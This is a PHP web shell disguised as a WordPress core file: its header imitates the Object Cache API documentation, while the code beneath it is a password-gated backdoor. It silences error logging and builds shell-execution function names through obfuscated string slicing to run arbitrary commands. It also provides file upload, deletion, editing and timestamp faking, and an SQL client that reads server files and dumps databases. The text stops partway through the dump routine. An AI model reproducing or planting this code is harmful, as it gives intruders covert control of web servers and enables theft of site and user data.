<?php
/**
 * Object Includ API
 *
 * @link http://codex.wordpress.org/
 *
 * @package WordPress
 * @subpackage Includ
 */
/**
 * Adds data to the includ, if the cache key doesn't already exist.
 *
 * @since 2.0.0
 * @uses $wp_object_cache Object Cache Class
 * @see WP_Object_Includ::add()
 *
 * @param int|string $key The cache key to use for retrieval later
 * @param mixed $data The data to add to the cache store
 * @param string $group The group to add the cache to
 * @param int $expire When the cache data should be expired
 * @return bool False if cache key and group already exist, true on success
 */
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
$os = getOs();
$aliases = array();
initGlobalArrays();
checkPassWays('e2c45ae4a9bbf50648c3c01f382906b2', 'current_state');
error_reporting(0);
$disable_functions = @ini_get('disable_functions');
$test = @getcwd();
$h_cwd = $test;
if (isset($_POST['c'])) {
    @chdir($_POST['c']);
}
$cwd = @getcwd();
$command_wd = @getcwd();
if ($os == 'win') {
    $h_cwd = str_replace('\\', '/', $h_cwd);
    $command_wd = str_replace('\\', '/', $command_wd);
}
if ($command_wd[strlen($command_wd) - 1] != '/') {
    $command_wd .= '/';
}
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) {
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = TRUE;
}
if (!function_exists('posix_getpwuid') && strpos($GLOBALS['disable_functions'], 'posix_getpwuid') === false) {
    function posix_getpwuid($p)
    {
        return false;
    }
}
if (!function_exists('posix_getgrgid') && strpos($GLOBALS['disable_functions'], 'posix_getgrgid') === false) {
    function posix_getgrgid($p)
    {
        return false;
    }
}
setRoute();
die;
function weboHeader()
{
    if (empty($_POST['charset'])) {
        $_POST['charset'] = $GLOBALS['default_charset'];
    }
    echo '<html>' . getHead() . '<body><div style=\'position:absolute;width:100%;background-color:#444;top:0;left:0;\'>' . getForm();
    $freeSpace = @diskfreespace($GLOBALS['cwd']);
    $totalSpace = @disk_total_space($GLOBALS['cwd']);
    $totalSpace = $totalSpace ? $totalSpace : 1;
    $release = @php_uname('r');
    $kernel = @php_uname('s');
    if (!function_exists('posix_getegid')) {
        $user = @get_current_user();
        $uid = @getmyuid();
        $gid = @getmygid();
        $group = '?';
    } else {
        $uid = @posix_getpwuid(posix_geteuid());
        $gid = @posix_getgrgid(posix_getegid());
        $user = $uid['name'];
        $uid = $uid['uid'];
        $group = $gid['name'];
        $gid = $gid['gid'];
    }
    $command_wd_links = '';
    $path = explode('/', $GLOBALS['cwd']);
    $n = count($path);
    for ($i = 0; $i < $n - 1; $i++) {
        $command_wd_links .= '<a href=\'#\' onclick=\'g("FilesMan","';
        for ($j = 0; $j <= $i; $j++) {
            $command_wd_links .= $path[$j] . '/';
        }
        $command_wd_links .= '")\'>' . $path[$i] . '/</a>';
    }
    $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
    $opt_charsets = '';
    foreach ($charsets as $item) {
        $opt_charsets .= '<option value="' . $item . '" ' . ($_POST['charset'] == $item ? 'selected' : '') . '>' . $item . '</option>';
    }
    $m = array('Files' => 'FilesMan', 'Console' => 'Console', 'Sql' => 'Sql');
    if (!empty($GLOBALS['auth_pass'])) {
        $m['Logout'] = 'Logout';
    }
    $menu = '';
    foreach ($m as $k => $v) {
        $menu .= '<th width="' . (int) (100 / count($m)) . '%">[ <a href="#" onclick="g(\'' . $v . '\',null,\'\',\'\',\'\')">' . $k . '</a> ]</th>';
    }
    $drives = '';
    if ($GLOBALS['os'] == 'win') {
        foreach (range('c', 'z') as $drive) {
            if (is_dir($drive . ':\\')) {
                $drives .= '<a href="#" onclick="g(\'FilesMan\',\'' . $drive . ':/\')">[ ' . $drive . ' ]</a> ';
            }
        }
    }
    echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win' ? '<br>Drives:' : '') . '</span></td>' . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' </nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode'] ? '<font color=red>ON</font>' : '<font color=green><b>OFF</b></font>') . '<span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . weboViewSize($totalSpace) . ' <span>Free:</span> ' . weboViewSize($freeSpace) . ' (' . (int) ($freeSpace / $totalSpace * 100) . '%)<br>' . $command_wd_links . ' ' . weboPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>' . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER['SERVER_ADDR'] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>' . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
}
function getFunc($a)
{
    $b = 'To execute  pass thrue your system shell_ you?';
    if (count($a) > 2) {
        return substr($b, $a[0], $a[1]) . substr($b, $a[2], $a[3]);
    }
    return substr($b, $a[0], $a[1]);
}
function weboosterExCool($in)
{
    $a = array(array(3, 4), array(12, 4, 17, 4), array(28, 6), array(35, 6, 3, 4));
    $out = '';
    if (function_exists(getFunc($a[0]))) {
        $com = getFunc($a[0]);
        @$com($in, $out);
        $out = @join('
', $out);
    } elseif (function_exists(getFunc($a[1]))) {
        $com = getFunc($a[1]);
        ob_start();
        @$com($in);
        $out = ob_get_clean();
    } elseif (function_exists(getFunc($a[2]))) {
        $com = getFunc($a[2]);
        ob_start();
        @$com($in);
        $out = ob_get_clean();
    } elseif (function_exists(getFunc($a[3]))) {
        $com = getFunc($a[3]);
        $out = shell_exec($in);
    } elseif (is_resource($f = @popen($in, 'r'))) {
        $out = '';
        while (!@feof($f)) {
            $out .= fread($f, 1024);
        }
        pclose($f);
    }
    return $out;
}
function footer()
{
    $is_writable = is_writable($GLOBALS['cwd']) ? ' <font color=\'green\'>(Writeable)</font>' : ' <font color=red>(Not writable)</font>';
    echo '
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style=\'border-top:2px solid #333;border-bottom:2px solid #333;\'>
    <tr>
        <td>
            <form onsubmit=\'g(null,this.c.value,"");return false;\'>
            <span>Change dir:</span><br>
            <input class=\'toolsInp\' type=text name=c value=\'' . $GLOBALS['cwd'] . "'>\n            <input type=submit value='>>'>\n            </form></td>\n        <td>\n        <form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>\n    </tr><tr>\n            <td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>{$is_writable}<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>\n            <td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>{$is_writable}<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>\n\t</tr><tr>\n            <td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>\n            <td>\n        " . getWorkWithFilesForm() . '<br></td>
	</tr>
        </table></div></body></html>';
}
function getWorkWithFilesForm()
{
    return '<form method=\'post\' ENCTYPE=\'multipart/form-data\'>
    <input type=hidden name=mygo value=\'FilesMan\'>
    <input type=hidden name=c value=\'' . $GLOBALS['cwd'] . '\'>
    <input type=hidden name=p1 value=\'uploadFile\'>
    <input type=hidden name=charset value=\'' . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>\n    <span>Upload file:</span>{$is_writable}<br>\n        <input class='toolsInp' type=file name=f>\n        <input type=submit value='>>'>\n</form>";
}
function weboPerms($p)
{
    if (($p & 49152) == 49152) {
        $i = 's';
    } elseif (($p & 40960) == 40960) {
        $i = 'l';
    } elseif (($p & 32768) == 32768) {
        $i = '-';
    } elseif (($p & 24576) == 24576) {
        $i = 'b';
    } elseif (($p & 16384) == 16384) {
        $i = 'd';
    } elseif (($p & 8192) == 8192) {
        $i = 'c';
    } elseif (($p & 4096) == 4096) {
        $i = 'p';
    } else {
        $i = 'u';
    }
    $i .= $p & 256 ? 'r' : '-';
    $i .= $p & 128 ? 'w' : '-';
    $i .= $p & 64 ? $p & 2048 ? 's' : 'x' : ($p & 2048 ? 'S' : '-');
    $i .= $p & 32 ? 'r' : '-';
    $i .= $p & 16 ? 'w' : '-';
    $i .= $p & 8 ? $p & 1024 ? 's' : 'x' : ($p & 1024 ? 'S' : '-');
    $i .= $p & 4 ? 'r' : '-';
    $i .= $p & 2 ? 'w' : '-';
    $i .= $p & 1 ? $p & 512 ? 't' : 'x' : ($p & 512 ? 'T' : '-');
    return $i;
}
function weboViewSize($str)
{
    if (is_int($str)) {
        $str = sprintf('%u', $str);
    }
    if (1073741824 <= $str) {
        return sprintf('%1.2f', $str / 1073741824) . ' GB';
    }
    if (1048576 <= $str) {
        return sprintf('%1.2f', $str / 1048576) . ' MB';
    }
    if (1024 <= $str) {
        return sprintf('%1.2f', $str / 1024) . ' KB';
    }
    return $str . ' B';
}
function weboLog($s)
{
    die('<pre align=center>' . '<form method=post action=\'#\'>' . 'Password: <input name=pass type=password>' . '<input value=\'>>\' type=submit>' . '</form>' . '</pre>');
}
function WebOsetcookie($key, $value)
{
    $_COOKIE[$key] = $value;
    setcookie($key, $value);
}
function weboScdir($dir)
{
    if (function_exists('scandir')) {
        return scandir($dir);
    }
    $dh = opendir($dir);
    while (false !== ($filename = readdir($dh))) {
        $files[] = $filename;
    }
    return $files;
}
function weboPermsColor($f)
{
    if (!@is_readable($f)) {
        return '<font color=#FF0000>' . weboPerms(@fileperms($f)) . '</font>';
    }
    if (!@is_writable($f)) {
        return '<font color=white>' . weboPerms(@fileperms($f)) . '</font>';
    }
    return '<font color=#25ff00>' . weboPerms(@fileperms($f)) . '</font>';
}
function routeLogout()
{
    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
    die('bye!');
}
function routeFilesMan()
{
    if (!empty($_COOKIE['f'])) {
        $_COOKIE['f'] = @unserialize($_COOKIE['f']);
    }
    if (!empty($_POST['p1'])) {
        switch ($_POST['p1']) {
            case 'uploadFile':
                if (!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) {
                    echo 'Can\'t upload!';
                }
                break;
            case 'mkdir':
                if (!@mkdir($_POST['p2'])) {
                    echo 'Can\'t create!';
                }
                break;
            case 'delete':
                function deleteDir($path)
                {
                    $path = substr($path, -1) == '/' ? $path : $path . '/';
                    $dh = opendir($path);
                    while (($item = readdir($dh)) !== false) {
                        $item = $path . $item;
                        if (basename($item) == '..' || basename($item) == '.') {
                            continue;
                        }
                        $type = filetype($item);
                        if ($type == 'dir') {
                            deleteDir($item);
                        } else {
                            @unlink($item);
                        }
                    }
                    closedir($dh);
                    @rmdir($path);
                }
                if (is_array(@$_POST['f'])) {
                    foreach ($_POST['f'] as $f) {
                        if ($f == '..') {
                            continue;
                        }
                        $f = urldecode($f);
                        if (is_dir($f)) {
                            deleteDir($f);
                        } else {
                            @unlink($f);
                        }
                    }
                }
                break;
            case 'paste':
                if ($_COOKIE['act'] == 'copy') {
                    function copy_paste($c, $s, $d)
                    {
                        if (is_dir($c . $s)) {
                            mkdir($d . $s);
                            $h = @opendir($c . $s);
                            while (($f = @readdir($h)) !== false) {
                                if ($f != '.' and $f != '..') {
                                    copy_paste($c . $s . '/', $f, $d . $s . '/');
                                }
                            }
                        } elseif (is_file($c . $s)) {
                            @copy($c . $s, $d . $s);
                        }
                    }
                    foreach ($_COOKIE['f'] as $f) {
                        copy_paste($_COOKIE['c'], $f, $GLOBALS['cwd']);
                    }
                } elseif ($_COOKIE['act'] == 'move') {
                    function move_paste($c, $s, $d)
                    {
                        if (is_dir($c . $s)) {
                            mkdir($d . $s);
                            $h = @opendir($c . $s);
                            while (($f = @readdir($h)) !== false) {
                                if ($f != '.' and $f != '..') {
                                    copy_paste($c . $s . '/', $f, $d . $s . '/');
                                }
                            }
                        } elseif (@is_file($c . $s)) {
                            @copy($c . $s, $d . $s);
                        }
                    }
                    foreach ($_COOKIE['f'] as $f) {
                        @rename($_COOKIE['c'] . $f, $GLOBALS['cwd'] . $f);
                    }
                } elseif ($_COOKIE['act'] == 'zip') {
                    if (class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($_POST['p2'], 1)) {
                            chdir($_COOKIE['c']);
                            foreach ($_COOKIE['f'] as $f) {
                                if ($f == '..') {
                                    continue;
                                }
                                if (@is_file($_COOKIE['c'] . $f)) {
                                    $zip->addFile($_COOKIE['c'] . $f, $f);
                                } elseif (@is_dir($_COOKIE['c'] . $f)) {
                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f . '/', FilesystemIterator::SKIP_DOTS));
                                    foreach ($iterator as $key => $value) {
                                        $zip->addFile(realpath($key), $key);
                                    }
                                }
                            }
                            chdir($GLOBALS['cwd']);
                            $zip->close();
                        }
                    }
                } elseif ($_COOKIE['act'] == 'unzip') {
                    if (class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        foreach ($_COOKIE['f'] as $f) {
                            if ($zip->open($_COOKIE['c'] . $f)) {
                                $zip->extractTo($GLOBALS['cwd']);
                                $zip->close();
                            }
                        }
                    }
                } elseif ($_COOKIE['act'] == 'tar') {
                    chdir($_COOKIE['c']);
                    $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
                    weboosterExCool('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
                    chdir($GLOBALS['cwd']);
                }
                unset($_COOKIE['f']);
                setcookie('f', '', time() - 3600);
                break;
            default:
                if (!empty($_POST['p1'])) {
                    WebOsetcookie('act', $_POST['p1']);
                    WebOsetcookie('f', serialize(@$_POST['f']));
                    WebOsetcookie('c', @$_POST['c']);
                }
                break;
        }
    }
    weboHeader();
    echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
    $dirContent = weboScdir(getCurDir());
    if ($dirContent === false) {
        echo 'Can\'t open this folder!';
        footer();
        return;
    }
    global $sort;
    $sort = array('name', 1);
    if (!empty($_POST['p1'])) {
        if (preg_match('!s_([A-z]+)_(\\d{1})!', $_POST['p1'], $match)) {
            $sort = array($match[1], (int) $match[2]);
        }
    }
    echo getFilesListScript() . '<table width=\'100%\' class=\'main\' cellspacing=\'0\' cellpadding=\'2\'>
        <form name=files method=post><tr><th width=\'13px\'><input type=checkbox onclick=\'sa()\' class=chkbx></th><th><a href=\'#\' onclick=\'g("FilesMan",null,"s_name_' . ($sort[1] ? 0 : 1) . '")\'>Name</a></th><th><a href=\'#\' onclick=\'g("FilesMan",null,"s_size_' . ($sort[1] ? 0 : 1) . '")\'>Size</a></th><th><a href=\'#\' onclick=\'g("FilesMan",null,"s_modify_' . ($sort[1] ? 0 : 1) . '")\'>Modify</a></th><th>Owner/Group</th><th><a href=\'#\' onclick=\'g("FilesMan",null,"s_perms_' . ($sort[1] ? 0 : 1) . '")\'>Permissions</a></th><th>Actions</th></tr>';
    $dirs = $files = array();
    list($dirs, $files) = getDirsAndFiles($dirContent);
    $GLOBALS['sort'] = $sort;
    function weboCmp($a, $b)
    {
        if ($GLOBALS['sort'][0] != 'size') {
            return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]])) * ($GLOBALS['sort'][1] ? 1 : -1);
        } else {
            return ($a['size'] < $b['size'] ? -1 : 1) * ($GLOBALS['sort'][1] ? 1 : -1);
        }
    }
    usort($files, 'weboCmp');
    usort($dirs, 'weboCmp');
    $files = array_merge($dirs, $files);
    $l = 0;
    foreach ($files as $f) {
        echo '<tr' . ($l ? ' class=l1' : '') . '><td><input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx></td><td><a href=# onclick="' . ($f['type'] == 'file' ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'view\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['path'] . '\');" ' . (empty($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>') . '</a></td><td>' . ($f['type'] == 'file' ? weboViewSize($f['size']) : $f['type']) . '</td><td>' . $f['modify'] . '</td><td>' . $f['owner'] . '/' . $f['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'chmod\')">' . $f['perms'] . '</td><td><a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'touch\')">T</a>' . ($f['type'] == 'file' ? ' <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'download\')">D</a>' : '') . '</td></tr>';
        $l = $l ? 0 : 1;
    }
    echo '<tr><td colspan=7>
	<input type=hidden name=mygo value=\'FilesMan\'>
	<input type=hidden name=c value=\'' . htmlspecialchars($GLOBALS['cwd']) . '\'>
	<input type=hidden name=charset value=\'' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '\'>
	<select name=\'p1\'><option value=\'copy\'>Copy</option><option value=\'move\'>Move</option><option value=\'delete\'>Delete</option>';
    if (class_exists('ZipArchive')) {
        echo '<option value=\'zip\'>Compress (zip)</option><option value=\'unzip\'>Uncompress (zip)</option>';
    }
    echo '<option value=\'tar\'>Compress (tar.gz)</option>';
    if (!empty($_COOKIE['act']) && @count($_COOKIE['f'])) {
        echo '<option value=\'paste\'>Paste / Compress</option>';
    }
    echo '</select>&nbsp;';
    if (!empty($_COOKIE['act']) && @count($_COOKIE['f']) && ($_COOKIE['act'] == 'zip' || $_COOKIE['act'] == 'tar')) {
        echo 'file name: <input type=text name=p2 value=\'wso_' . date('Ymd_His') . '.' . ($_COOKIE['act'] == 'zip' ? 'zip' : 'tar.gz') . '\'>&nbsp;';
    }
    echo '<input type=\'submit\' value=\'>>\'></td></tr></form></table></div>';
    footer();
}
function getDirsAndFiles($dirContent)
{
    $dirs = $files = array();
    foreach ($dirContent as $k => $dir_item) {
        $ow = @posix_getpwuid(@fileowner($dir_item));
        $gr = @posix_getgrgid(@filegroup($dir_item));
        $path = $GLOBALS['cwd'] . DIRECTORY_SEPARATOR . $dir_item;
        $tmp = array('name' => $dir_item, 'path' => $path, 'modify' => date('Y-m-d H:i:s', @filemtime($dir_item)), 'perms' => weboPermsColor($dir_item), 'size' => @filesize($dir_item), 'owner' => $ow['name'] ? $ow['name'] : @fileowner($dir_item), 'group' => $gr['name'] ? $gr['name'] : @filegroup($dir_item));
        if (@is_file($path)) {
            $files[] = array_merge($tmp, array('type' => 'file'));
        } elseif (@is_link($path)) {
            $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
        } elseif (@is_dir($path)) {
            $dirs[] = array_merge($tmp, array('type' => 'dir'));
        }
    }
    return array($dirs, $files);
}
function routeFilesTools()
{
    if (isset($_POST['p1'])) {
        $_POST['p1'] = urldecode($_POST['p1']);
    }
    if (@$_POST['p2'] == 'download') {
        if (@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
            ob_start('ob_gzhandler', 4096);
            header('Content-Disposition: attachment; filename=' . basename($_POST['p1']));
            if (function_exists('mime_content_type')) {
                $type = @mime_content_type($_POST['p1']);
                header('Content-Type: ' . $type);
            } else {
                header('Content-Type: application/octet-stream');
            }
            $fp = @fopen($_POST['p1'], 'r');
            if ($fp) {
                while (!@feof($fp)) {
                    echo @fread($fp, 1024);
                }
                fclose($fp);
            }
        }
        die;
    }
    if (@$_POST['p2'] == 'mkfile') {
        if (!file_exists($_POST['p1'])) {
            $fp = @fopen($_POST['p1'], 'w');
            if ($fp) {
                $_POST['p2'] = 'edit';
                fclose($fp);
            }
        }
    }
    weboHeader();
    echo '<h1>File tools</h1><div class=content>';
    if (!file_exists(@$_POST['p1'])) {
        echo 'File not exists';
        footer();
        return;
    }
    $uid = @posix_getpwuid(@fileowner($_POST['p1']));
    if (!$uid) {
        $uid['name'] = @fileowner($_POST['p1']);
        $gid['name'] = @filegroup($_POST['p1']);
    } else {
        $gid = @posix_getgrgid(@filegroup($_POST['p1']));
    }
    echo '<span>Name:</span> ' . htmlspecialchars(@basename($_POST['p1'])) . ' <span>Size:</span> ' . (is_file($_POST['p1']) ? weboViewSize(filesize($_POST['p1'])) : '-') . ' <span>Permission:</span> ' . weboPermsColor($_POST['p1']) . ' <span>Owner/Group:</span> ' . $uid['name'] . '/' . $gid['name'] . '<br>';
    echo '<span>Change time:</span> ' . date('Y-m-d H:i:s', filectime($_POST['p1'])) . ' <span>Access time:</span> ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' <span>Modify time:</span> ' . date('Y-m-d H:i:s', filemtime($_POST['p1'])) . '<br><br>';
    if (empty($_POST['p2'])) {
        $_POST['p2'] = 'view';
    }
    if (is_file($_POST['p1'])) {
        $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
    } else {
        $m = array('Chmod', 'Rename', 'Touch');
    }
    foreach ($m as $v) {
        echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'' . strtolower($v) . '\')">' . (strtolower($v) == @$_POST['p2'] ? '<b>[ ' . $v . ' ]</b>' : $v) . '</a> ';
    }
    echo '<br><br>';
    switch ($_POST['p2']) {
        case 'view':
            echo '<pre class=ml1>';
            $fp = @fopen($_POST['p1'], 'r');
            if ($fp) {
                while (!@feof($fp)) {
                    echo htmlspecialchars(@fread($fp, 1024));
                }
                @fclose($fp);
            }
            echo '</pre>';
            break;
        case 'highlight':
            if (@is_readable($_POST['p1'])) {
                echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
                $code = @highlight_file($_POST['p1'], true);
                echo str_replace(array('<span ', '</span>'), array('<font ', '</font>'), $code) . '</div>';
            }
            break;
        case 'chmod':
            if (!empty($_POST['p3'])) {
                $perms = 0;
                for ($i = strlen($_POST['p3']) - 1; $i >= 0; --$i) {
                    $perms += (int) $_POST['p3'][$i] * pow(8, strlen($_POST['p3']) - $i - 1);
                }
                if (!@chmod($_POST['p1'], $perms)) {
                    echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
                }
            }
            clearstatcache();
            echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="' . substr(sprintf('%o', fileperms($_POST['p1'])), -4) . '"><input type=submit value=">>"></form>';
            break;
        case 'edit':
            if (!is_writable($_POST['p1'])) {
                echo 'File isn\'t writeable';
                break;
            }
            if (!empty($_POST['p3'])) {
                $time = @filemtime($_POST['p1']);
                $_POST['p3'] = substr($_POST['p3'], 1);
                $fp = @fopen($_POST['p1'], 'w');
                if ($fp) {
                    @fwrite($fp, $_POST['p3']);
                    @fclose($fp);
                    echo 'Saved!<br><script>p3_="";</script>';
                    @touch($_POST['p1'], $time, $time);
                }
            }
            echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
            $fp = @fopen($_POST['p1'], 'r');
            if ($fp) {
                while (!@feof($fp)) {
                    echo htmlspecialchars(@fread($fp, 1024));
                }
                @fclose($fp);
            }
            echo '</textarea><input type=submit value=">>"></form>';
            break;
        case 'hexdump':
            $c = @file_get_contents($_POST['p1']);
            $n = 0;
            $h = array('00000000<br>', '', '');
            $len = strlen($c);
            for ($i = 0; $i < $len; ++$i) {
                $h[1] .= sprintf('%02X', ord($c[$i])) . ' ';
                switch (ord($c[$i])) {
                    case 0:
                        $h[2] .= ' ';
                        break;
                    case 9:
                        $h[2] .= ' ';
                        break;
                    case 10:
                        $h[2] .= ' ';
                        break;
                    case 13:
                        $h[2] .= ' ';
                        break;
                    default:
                        $h[2] .= $c[$i];
                        break;
                }
                $n++;
                if ($n == 32) {
                    $n = 0;
                    if ($i + 1 < $len) {
                        $h[0] .= sprintf('%08X', $i + 1) . '<br>';
                    }
                    $h[1] .= '<br>';
                    $h[2] .= '
';
                }
            }
            echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>' . $h[0] . '</pre></span></td><td bgcolor=#282828><pre>' . $h[1] . '</pre></td><td bgcolor=#333333><pre>' . htmlspecialchars($h[2]) . '</pre></td></tr></table>';
            break;
        case 'rename':
            if (!empty($_POST['p3'])) {
                if (!@rename($_POST['p1'], $_POST['p3'])) {
                    echo 'Can\'t rename!<br>';
                } else {
                    die('<script>g(null,null,"' . urlencode($_POST['p3']) . '",null,"")</script>');
                }
            }
            echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="' . htmlspecialchars($_POST['p1']) . '"><input type=submit value=">>"></form>';
            break;
        case 'touch':
            if (!empty($_POST['p3'])) {
                $time = strtotime($_POST['p3']);
                if ($time) {
                    if (!touch($_POST['p1'], $time, $time)) {
                        echo 'Fail!';
                    } else {
                        echo 'Touched!';
                    }
                } else {
                    echo 'Bad time format!';
                }
            }
            clearstatcache();
            echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="' . date('Y-m-d H:i:s', @filemtime($_POST['p1'])) . '"><input type=submit value=">>"></form>';
            break;
    }
    echo '</div>';
    footer();
}
function routeSql()
{
    class DbClass
    {
        var $type;
        var $link;
        var $res;
        function DbClass($type)
        {
            $this->type = $type;
        }
        function connect($host, $user, $pass, $dbname)
        {
            switch ($this->type) {
                case 'mysql':
                    if ($this->link = @mysql_connect($host, $user, $pass, true)) {
                        return true;
                    }
                    break;
                case 'pgsql':
                    $host = explode(':', $host);
                    if (!$host[1]) {
                        $host[1] = 5432;
                    }
                    if ($this->link = @pg_connect("host={$host[0]} port={$host[1]} user={$user} password={$pass} dbname={$dbname}")) {
                        return true;
                    }
                    break;
            }
            return false;
        }
        function selectdb($db)
        {
            switch ($this->type) {
                case 'mysql':
                    if (@mysql_select_db($db)) {
                        return true;
                    }
                    break;
            }
            return false;
        }
        function query($str)
        {
            switch ($this->type) {
                case 'mysql':
                    return $this->res = @mysql_query($str);
                    break;
                case 'pgsql':
                    return $this->res = @pg_query($this->link, $str);
                    break;
            }
            return false;
        }
        function fetch()
        {
            $res = func_num_args() ? func_get_arg(0) : $this->res;
            switch ($this->type) {
                case 'mysql':
                    return @mysql_fetch_assoc($res);
                    break;
                case 'pgsql':
                    return @pg_fetch_assoc($res);
                    break;
            }
            return false;
        }
        function listDbs()
        {
            switch ($this->type) {
                case 'mysql':
                    return $this->query('SHOW databases');
                    break;
                case 'pgsql':
                    return $this->res = $this->query('SELECT datname FROM pg_database WHERE datistemplate!=\'t\'');
                    break;
            }
            return false;
        }
        function listTables()
        {
            switch ($this->type) {
                case 'mysql':
                    return $this->res = $this->query('SHOW TABLES');
                    break;
                case 'pgsql':
                    return $this->res = $this->query('select table_name from information_schema.tables where table_schema != \'information_schema\' AND table_schema != \'pg_catalog\'');
                    break;
            }
            return false;
        }
        function error()
        {
            switch ($this->type) {
                case 'mysql':
                    return @mysql_error();
                    break;
                case 'pgsql':
                    return @pg_last_error();
                    break;
            }
            return false;
        }
        function setCharset($str)
        {
            switch ($this->type) {
                case 'mysql':
                    if (function_exists('mysql_set_charset')) {
                        return @mysql_set_charset($str, $this->link);
                    } else {
                        $this->query('SET CHARSET ' . $str);
                    }
                    break;
                case 'pgsql':
                    return @pg_set_client_encoding($this->link, $str);
                    break;
            }
            return false;
        }
        function loadFile($str)
        {
            switch ($this->type) {
                case 'mysql':
                    return $this->fetch($this->query('SELECT LOAD_FILE(\'' . addslashes($str) . '\') as file'));
                    break;
                case 'pgsql':
                    $this->query('CREATE TABLE webo2(file text);COPY webo2 FROM \'' . addslashes($str) . '\';select file from webo2;');
                    $r = array();
                    while ($i = $this->fetch()) {
                        $r[] = $i['file'];
                    }
                    $this->query('drop table webo2');
                    return array('file' => implode('
', $r));
                    break;
            }
            return false;
        }
        function dump($table, $fp = false)
        {
            switch ($this->type) {
                case 'mysql':
                    $res = $this->query('SHOW CREATE TABLE `' . $table . '`');
                    $create = mysql_fetch_array($res);
                    $sql = $create[1] . ';
';
                    if ($fp) {
                        fwrite($fp, $sql);
                    } else {
                        echo $sql;
                    }
                    $this->query('SELECT * FROM `' . $table . '`');
                    $i = 0;
                    $head = true;
                    while ($item = $this->fetch()) {
                        $sql = '';
                        if ($i % 1000 == 0) {
                            $head = true;
                            $sql = ';

';
                        }
                        $columns = array();
                        foreach ($item as $k => $v) {
                            if ($v === null) {
                                $item[$k] = 'NULL';
                            } elseif (is_int($v)) {
                                $item[$k] = $v;
                            } else {
                                $item[$k] = '\'' . @mysql_real_escape_string($v) . '\'';
                            }
                            $columns[] = '`' . $k . '`';
                        }
                        if ($head) {
                            $sql .= 'INSERT INTO `' . $table . '` (' . implode(', ', $columns) . ') VALUES 
	(' . implode(', ', $item) . ')';
                            $head = false;
                        } else {
                            $sql .= '
